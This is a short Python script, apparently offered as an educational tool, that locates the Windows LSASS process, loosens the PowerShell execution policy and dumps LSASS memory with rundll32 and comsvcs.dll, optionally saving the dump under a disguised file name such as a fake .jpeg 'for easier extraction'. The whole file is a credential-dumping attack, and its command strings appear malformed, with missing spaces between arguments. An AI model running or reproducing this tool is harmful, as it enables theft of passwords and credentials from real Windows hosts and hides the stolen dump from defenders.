#Made by Joe issa
#for educational purposes only !

import subprocess
import psutil

process_name = "lsass"
pid = None
for proc in psutil.process_iter():
    if process_name in proc.name():
       pid = proc.pid
pid = str(pid)
subprocess.Popen(["powershell.exe","Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force"],stdout=subprocess.PIPE);
Q = input("Do you want to save your Dumped LSASS in another name and format for easier extraction ?(yes/no)").lower()
if Q == "yes":
    a = input("Please enter your custom name and extansion - for example (Not_lsass.jpeg)")
    subprocess.Popen(["powershell.exe", "rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump"+pid+'C:\DMP\''+a+"full"],stdout=subprocess.PIPE);
elif Q == "no":
    print("dumping your LSASS -- Process ID: "+pid)
    subprocess.Popen(["powershell.exe","rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump"+pid+"C:\DMP\lsass.dmp full"],stdout=subprocess.PIPE);
else:
    print("Please Answer with yes or no")
    exit()
print("Done")
